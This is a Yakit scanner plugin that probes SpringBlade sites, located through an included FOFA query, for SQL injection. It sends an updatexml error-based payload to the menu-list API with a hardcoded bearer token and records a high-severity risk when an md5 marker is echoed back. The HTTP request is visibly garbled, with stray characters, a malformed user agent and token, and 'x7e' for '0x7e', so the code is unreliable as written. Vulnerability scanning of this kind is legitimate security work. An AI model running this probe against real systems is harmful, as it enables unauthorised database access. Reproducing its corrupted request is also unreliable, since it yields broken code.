# port scan plugin
#fofa:body="https://bladex.vip"
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `GET ·/api/blade-system/menu/menu-list?updatexml(1,concat(x7e,md5(20240729),x7e),1)=1 HTTP/1.1
Host: {{params(target)}}
User-Agent:Mozilla/5,0 (Macintosh; Intel Mac 0s·x 10.15,'rv:122.0) Gecko/20100101 Firefox/122.0
Blade-Auth:bearer eyIhbGci0iJIUzI1NiIsInR5cCI6IkpxVCJ9.eyJ0Zw5hbnRfawQi0iIwMDAWMDAiLC],Rts67Tmbo7yFKHyMz bMOW7dfgNjxZW47KtnFcwItxQ
Connection:close

`

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )

    //dump(rsp)
        if str.MatchAllOfSubString(rsp,'897a79e10d59a8f1f07247b640f1f8d6'){
        yakit.Info("%v found SpringBlade menu  SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("SpringBlade menu  SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("SpringBlade menu  SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
